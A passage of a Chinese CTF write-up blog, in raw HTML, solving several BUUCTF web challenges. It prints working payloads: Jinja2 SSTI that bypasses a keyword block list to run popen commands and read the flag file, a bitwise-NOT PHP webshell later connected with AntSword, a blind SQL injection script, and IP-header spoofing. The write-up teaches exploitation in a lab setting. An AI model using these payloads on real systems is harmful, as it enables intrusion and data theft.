class="line"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="meta">        res =  render_template_string(<span class="params">tmp</span>)</span></span></span></span></span></span></span><br><span class="line"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="meta">        flash(<span class="params">tmp</span>)</span></span></span></span></span></span></span><br><span class="line"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="meta">        <span class="keyword">return</span> redirect(<span class="params">url_for(<span class="params">&amp;<span class="comment">#39;encode&amp;#39;))</span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="meta"></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="meta">    <span class="keyword">else</span> :</span></span></span></span></span></span></span></span></span><br><span class="line"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="meta">        text = &amp;<span class="comment">#34;&amp;#34;</span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="meta">        form = NameForm(<span class="params">text</span>)</span></span></span></span></span></span></span></span></span><br><span class="line"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="meta">        <span class="keyword">return</span> render_template(<span class="params">&amp;<span class="comment">#34;index.html&amp;#34;,form = form ,method = &amp;#34;加密&amp;#34; ,img = &amp;#34;flask.png&amp;#34;)</span></span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="meta"></span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="meta">@app.route(<span class="params">&amp;<span class="comment">#39;/decode&amp;#39;,methods=[&amp;#39;POST&amp;#39;,&amp;#39;GET&amp;#39;])</span></span></span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="meta"><span class="keyword">def</span> decode(<span class="params"></span>):</span></span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="meta">    <span class="keyword">if</span> request.values.get(<span class="params">&amp;<span class="comment">#39;text&amp;#39;) :</span></span></span></span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="meta">        text = request.values.get(<span class="params">&amp;<span class="comment">#34;text&amp;#34;)</span></span></span></span></span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="meta">        text_decode = base64.b64decode(<span class="params">text.encode(<span class="params"></span>)</span>)</span></span></span></span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="meta">        tmp = &amp;<span class="comment">#34;结果 ： &#123;0&#125;&amp;#34;.format(text_decode.decode())</span></span></span></span></span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="meta">        <span class="keyword">if</span> waf(<span class="params">tmp</span>) :</span></span></span></span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="meta">            flash(<span class="params">&amp;<span class="comment">#34;no no no !!&amp;#34;)</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="meta">            <span class="keyword">return</span> redirect(<span class="params">url_for(<span class="params">&amp;<span class="comment">#39;decode&amp;#39;))</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="meta">        res =  render_template_string(<span class="params">tmp</span>)</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="meta">        flash(<span class="params"> res </span>)</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="meta">        <span class="keyword">return</span> redirect(<span class="params">url_for(<span class="params">&amp;<span class="comment">#39;decode&amp;#39;))</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="meta"></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="meta">    <span class="keyword">else</span> :</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="meta">        text = &amp;<span class="comment">#34;&amp;#34;</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="meta">        form = NameForm1(<span class="params">text</span>)</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="meta">        <span class="keyword">return</span> render_template(<span class="params">&amp;<span class="comment">#34;index.html&amp;#34;,form = form, method = &amp;#34;解密&amp;#34; , img = &amp;#34;flask1.png&amp;#34;)</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="meta"></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="meta"></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="meta">@app.route(<span class="params">&amp;<span class="comment">#39;/&amp;lt;name&amp;gt;&amp;#39;,methods=[&amp;#39;GET&amp;#39;])</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="meta"><span class="keyword">def</span> not_found(<span class="params">name</span>):</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="meta">    <span class="keyword">return</span> render_template(<span class="params">&amp;<span class="comment">#34;404.html&amp;#34;,name = name)</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="meta"></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="meta"><span class="keyword">if</span> __name__ == &amp;<span class="comment">#39;__main__&amp;#39;:</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="meta">    app.run(<span class="params">host=&amp;<span class="comment">#34;0.0.0.0&amp;#34;, port=5000, debug=True)</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><br></pre></td></tr></table></figure><p>存在<code>waf</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params"><span class="built_in">str</span></span>):</span><br><span class="line">black_list = [<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;os&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;import&quot;</span>,<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;chr&quot;</span>,<span class="string">&quot;request&quot;</span>, <span class="string">&quot;subprocess&quot;</span>,<span class="string">&quot;commands&quot;</span>,<span class="string">&quot;socket&quot;</span>,<span class="string">&quot;hex&quot;</span>,<span class="string">&quot;base64&quot;</span>,<span class="string">&quot;*&quot;</span>,<span class="string">&quot;?&quot;</span>]</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> black_list :</span><br><span class="line"><span class="keyword">if</span> x <span class="keyword">in</span> <span class="built_in">str</span>.lower() :</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span></span><br></pre></td></tr></table></figure><p>稍微拼接下字符即可绕过，先查看目录</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__ == &#x27;catch_warnings&#x27; %&#125;</span><br><span class="line">  &#123;% for b in c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% if &#x27;eva&#x27;+&#x27;l&#x27; in b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[&#x27;eva&#x27;+&#x27;l&#x27;](&#x27;__impor&#x27;+&#x27;t__&#x27;+&#x27;(&quot;o&#x27;+&#x27;s&quot;)&#x27;+&#x27;.pope&#x27;+&#x27;n&#x27;+&#x27;(&quot;ls /&quot;).read()&#x27;) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p>发现<code>this_is_the_flag.txt</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__ == &#x27;catch_warnings&#x27; %&#125;</span><br><span class="line">  &#123;% for b in c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% if &#x27;eva&#x27;+&#x27;l&#x27; in b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[&#x27;eva&#x27;+&#x27;l&#x27;](&#x27;__impor&#x27;+&#x27;t__&#x27;+&#x27;(&quot;o&#x27;+&#x27;s&quot;)&#x27;+&#x27;.pope&#x27;+&#x27;n&#x27;+&#x27;(&quot;cat /this_is_the_fl&quot;+&quot;ag.txt&quot;).read()&#x27;) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p>也可以直接读取文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/this_is_the_fl&#x27;+&#x27;ag.txt&#x27;, &#x27;r&#x27;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p>还有一种计算<code>Pin</code>码的方法可以参考这篇<a href="https://blog.csdn.net/qq_45557476/article/details/124011030">博客</a></p><h2 id="极客大挑战-2019-RCE-ME"><a href="#极客大挑战-2019-RCE-ME" class="headerlink" title="[极客大挑战 2019]RCE ME"></a>[极客大挑战 2019]RCE ME</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>)&gt;<span class="number">40</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;This is too Long.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;NO.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ?&gt;</span></span><br></pre></td></tr></table></figure><p>无数字字母RCE，使用取反查看phpinfo</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?code=(~%8F%97%8F%96%91%99%90)();</span><br></pre></td></tr></table></figure><p>发现禁用了很多函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,dl</span><br></pre></td></tr></table></figure><p>写个马进去</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="string">&#x27;phpinfo&#x27;</span>).PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="string">&#x27;assert&#x27;</span>).PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="string">&#x27;(eval($_POST[a]))&#x27;</span>).PHP_EOL;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>使用</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET:</span><br><span class="line">/?code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%9E%A2%D6%D6);</span><br><span class="line">POST:</span><br><span class="line">a=phpinfo();</span><br></pre></td></tr></table></figure><p>蚁剑连接，然后使用绕过<code>disable_functions</code>中的<strong>PHP7 GC with Certain Destructors UAF</strong>进入终端，执行根目录下的<code>readflag</code>即可</p><h2 id="WUSTCTF2020-颜值成绩查询"><a href="#WUSTCTF2020-颜值成绩查询" class="headerlink" title="[WUSTCTF2020]颜值成绩查询"></a>[WUSTCTF2020]颜值成绩查询</h2><p>布尔盲注即可（注意空格被<code>ban</code>了，一开始没看出来，无语住了。。）<code>flag</code>在<code>value</code>字段</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://7e9f4e5b-51f8-45c5-b8fc-2269fcfbdfa7.node4.buuoj.cn:81/&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">60</span>):</span><br><span class="line">    l = <span class="number">32</span></span><br><span class="line">    r = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> l &lt; r:</span><br><span class="line">        mid = (l+r)&gt;&gt;<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span>(mid==l):</span><br><span class="line">            flag += <span class="built_in">chr</span>(mid)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        params = &#123;</span><br><span class="line">            <span class="comment"># 库：ctf</span></span><br><span class="line">            <span class="comment"># &quot;stunum&quot;:&quot;if(ascii(substr((select/**/database()),&#123;&#125;,1))&lt;&#123;&#125;,1,2)&quot;.format(i,mid)</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 表：flag,score</span></span><br><span class="line">            <span class="comment"># &quot;stunum&quot;:&quot;if(ascii(substr((select/**/group_concat(table_name)from/**/information_schema.tables/**/where/**/table_schema=database()),&#123;&#125;,1))&lt;&#123;&#125;,1,2)&quot;.format(i,mid)</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 列：flag,value</span></span><br><span class="line">            <span class="comment"># &quot;stunum&quot;:&quot;if(ascii(substr((select/**/group_concat(column_name)from/**/information_schema.columns/**/where/**/table_name=&#x27;flag&#x27;),&#123;&#125;,1))&lt;&#123;&#125;,1,2)&quot;.format(i,mid)</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># flag&#123;138d54f0-4e99-4114-9f8b-c40a158e6b51&#125;</span></span><br><span class="line">            <span class="string">&quot;stunum&quot;</span>:<span class="string">&quot;if(ascii(substr((select/**/group_concat(value)/**/from/**/flag),&#123;&#125;,1))&lt;&#123;&#125;,1,2)&quot;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line">        &#125;</span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        response = requests.get(url=url,params=params)</span><br><span class="line">        <span class="comment"># print(response.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;admin&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            r = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            l = mid</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> flag[-<span class="number">1</span>] == <span class="string">&#x27; &#x27;</span> <span class="keyword">or</span> flag[-<span class="number">1</span>] == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="MRCTF2020-套娃"><a href="#MRCTF2020-套娃" class="headerlink" title="[MRCTF2020]套娃"></a>[MRCTF2020]套娃</h2><p>查看源码发现</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//1st</span></span><br><span class="line"><span class="variable">$query</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span>( <span class="title function_ invoke__">substr_count</span>(<span class="variable">$query</span>, <span class="string">&#x27;_&#x27;</span>) !== <span class="number">0</span> || <span class="title function_ invoke__">substr_count</span>(<span class="variable">$query</span>, <span class="string">&#x27;%5f&#x27;</span>) != <span class="number">0</span> )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Y0u are So cutE!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b_u_p_t&#x27;</span>] !== <span class="string">&#x27;23333&#x27;</span> &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^23333$/&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;b_u_p_t&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;you are going to the next ~&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>空格、<code>+</code>、<code>[</code>会被转化为<code>_</code>，传入下面的参数发现<code>secrettw.php</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?b+u+p+t=23333%0a</span><br></pre></td></tr></table></figure><p>查看源码发现jsfuck，直接控制台解码或者用该<a href="https://www.bugku.com/tools/jsfuck/">工具</a>，得到<code>post me Merak</code>，传参后获得源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;takeip.php&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;.&#x27;</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;Merak&#x27;</span>]))&#123; </span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line">    <span class="keyword">die</span>(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span>(<span class="params"><span class="variable">$v</span></span>)</span>&#123; </span><br><span class="line">    <span class="variable">$v</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$v</span>); </span><br><span class="line">    <span class="variable">$re</span> = <span class="string">&#x27;&#x27;</span>; </span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$v</span>);<span class="variable">$i</span>++)&#123; </span><br><span class="line">        <span class="variable">$re</span> .= <span class="title function_ invoke__">chr</span> ( <span class="title function_ invoke__">ord</span> (<span class="variable">$v</span>[<span class="variable">$i</span>]) + <span class="variable">$i</span>*<span class="number">2</span> ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$re</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Local access only!&#x27;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$ip</span> = <span class="title function_ invoke__">getIp</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span>!=<span class="string">&#x27;127.0.0.1&#x27;</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Sorry,you don&#x27;t have permission!  Your ip is :&quot;</span>.<span class="variable">$ip</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span> === <span class="string">&#x27;127.0.0.1&#x27;</span> &amp;&amp; <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;2333&#x27;</span>]) === <span class="string">&#x27;todat is a happy day&#x27;</span> )&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Your REQUEST is:&quot;</span>.<span class="title function_ invoke__">change</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">change</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])); &#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>先用<code>Client-ip: 127.0.0.1</code>过掉对<code>ip</code>的判断，然后用<code>php://input</code>传入对应字符串到<code>23333</code>，最后用下面的代码生成<code>flag.php</code>对应的字符串</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">dechange</span>(<span class="params"><span class="variable">$v</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$re</span> = <span class="string">&#x27;&#x27;</span>; </span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$v</span>);<span class="variable">$i</span>++)&#123; </span><br><span class="line">        <span class="variable">$re</span> .= <span class="title function_ invoke__">chr</span> ( <span class="title function_ invoke__">ord</span> (<span class="variable">$v</span>[<span class="variable">$i</span>]) - <span class="variable">$i</span>*<span class="number">2</span> ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="variable">$payload</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$re</span>);</span><br><span class="line">    <span class="keyword">return</span>  <span class="variable">$payload</span>; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$s</span> = <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">dechange</span>(<span class="variable">$s</span>);</span><br><span class="line"><span class="comment">// ZmpdYSZmXGI=</span></span><br></pre></td></tr></table></figure><p>最终<code>payload</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/secrettw.php?file=ZmpdYSZmXGI=&amp;2333=php://input</span><br><span class="line"></span><br><span class="line">POST：</span><br><span class="line">todat is a happy day</span><br><span class="line"></span><br><span class="line">Headers：</span><br><span class="line">Client-ip: 127.0.0.1</span><br></pre></td></tr></table></figure><h2 id="FBCTF2019-RCEService"><a href="#FBCTF2019-RCEService" class="headerlink" title="[FBCTF2019]RCEService"></a>[FBCTF2019]RCEService</h2><p>打开发现要输入<code>json</code>格式命令，试了试发现下面这个可以</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?cmd=&#123;&quot;cmd&quot;:&quot;ls&quot;&#125;</span><br></pre></td></tr></table></figure><p>然后一通试也试不出来，搜了下wp发现大家都有源码是吧。。。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">putenv</span>(<span class="string">&#x27;PATH=/home/rceservice/jail&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$json</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="title function_ invoke__">is_string</span>(<span class="variable">$json</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">preg_match</span>(<span 